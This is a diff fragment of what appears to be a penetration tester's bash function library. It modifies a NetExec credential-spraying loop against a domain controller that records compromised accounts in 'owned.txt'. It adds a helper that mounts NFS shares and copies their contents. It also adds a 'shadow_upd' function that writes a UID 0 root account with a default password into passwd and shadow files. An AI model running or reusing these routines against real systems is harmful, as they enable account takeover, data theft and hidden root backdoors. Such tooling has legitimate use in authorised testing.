-                nxc $protocol  $1 -u $2 -H $3 -k --kdcHost $dc_fqdn --continue-on-success 2>/dev/null | stdbuf -oL grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | stdbuf -oL tee -a /tmp/spray_$dc_fqdn.tx
+                nxc $protocol  $1 -u $2 -H $3 -k --kdcHost $dc_fqdn --continue-on-success  | stdbuf -oL grep --color=never "+\|STATUS_NOT_SUPPORTED\|STATUS_ACCOUNT_RESTRICTION\|LOGON_TYPE_NOT_GRANTED\|CLIENT_CREDENTIALS_REVOKED\|STATUS_ACCOUNT_DISABLED\|PASSWORD_MUST_CHANGE\|STATUS_PASSWORD_EXPIRED" | stdbuf -oL tee -a /tmp/spray_$1.tx
             fi
-            cat /tmp/spray_$dc_fqdn.txt | grep + | awk '{print $6}' | awk -F"\\\\" '{print $2}' | awk -F":" '{print $1}' | sort -u | awk '{print $1 "@'$dom'"}' | anew -q owned.txt
-            cat /tmp/spray_$dc_fqdn.txt | grep + | awk '{print $4}' | sort -u | awk '{print $1 ".'$dom'"}' | anew -q owned.txt
+            cat /tmp/spray_$1.txt | grep + | awk '{print $6}' | awk -F"\\\\" '{print $2}' | awk -F":" '{print $1}' | sort -u | awk '{print $1 "@'$dom'"}' | anew -q owned.txt
+            cat /tmp/spray_$1.txt | grep + | awk '{print $4}' | sort -u | awk '{print $1 ".'$dom'"}' | anew -q owned.txt
         done
     fi
 }
@@ -3167,4 +3196,51 @@ generate_web_paths() {
     
     local line_count=$(wc -l < "$output_file" 2>/dev/null || echo "0")
     echo "Generated $line_count paths in: $output_file"
+}
+
+# Mount nfs share
+nfsmount(){
+    if [[ -z "$1" ]]; then
+        echo "Usage: nfsmount <IP> {<PORT>}"
+    fi
+    if [[ -z "$2" ]]; then
+        sudo mkdir -p /mnt/$1$shr && sudo mount -t nfs -o nolock $1:$shr /mnt/$1$shr && sudo ls -la /mnt/$1$shr
+    else
+        sudo mkdir -p /mnt/$1$shr && sudo mount -t nfs -o nolock -o port=$2 $1:$shr /mnt/$1$shr && sudo ls -la /mnt/$1$shr
+    fi
+    echo -e "\nCOPYING CONTENT INTO \"$1_$(echo $shr | tr '/' '_')\"\n"
+    sudo cp -r /mnt/$1$shr ./$1$(echo $shr | tr '/' '_')
+    sudo chmod -R +r ./$1$(echo $shr | tr '/' '_')
+    cd ./$1$(echo $shr | tr '/' '_')
+}
+
+# Add a user to /etc/passwd and /etc/shadow
+shadow_upd() {
+    local passwd_file="$1"
+    local shadow_file="$2"
+    local username="$3"
+    local password="${4:-defaultpassword123}"  # Default password if not provided
+    
+    if [[ -z "$1" ]]; then
+        echo "Usage: shadow_upd /etc/passwd /etc/shadow username {password}"
+    fi
+    # Generate password hash
+    local salt=$(openssl rand -hex 4)
+    local password_hash=$(openssl passwd -6 -salt "$salt" "$password")
+    
+    # Remove existing user from passwd if present
+    grep -v "^${username}:" "$passwd_file" > "${passwd_file}.tmp" && mv "${passwd_file}.tmp" "$passwd_file"
+    
+    # Remove existing user from shadow if present  
+    grep -v "^${username}:" "$shadow_file" > "${shadow_file}.tmp" && mv "${shadow_file}.tmp" "$shadow_file"
+    
+    # Add user to passwd (UID 0 = root)
+    echo "${username}:${password_hash}:0:0:root:/root:/bin/bash" >> "$passwd_file"
+    
+    # Add user to shadow
+    local days_since_epoch=$(( $(date +%s) / 86400 ))
+    echo "${username}:${password_hash}:${days_since_epoch}:0:99999:7:::" >> "$shadow_file"
+    
+    echo "User '${username}' added/updated with root privileges"
+    echo "Password: ${password}"
 }
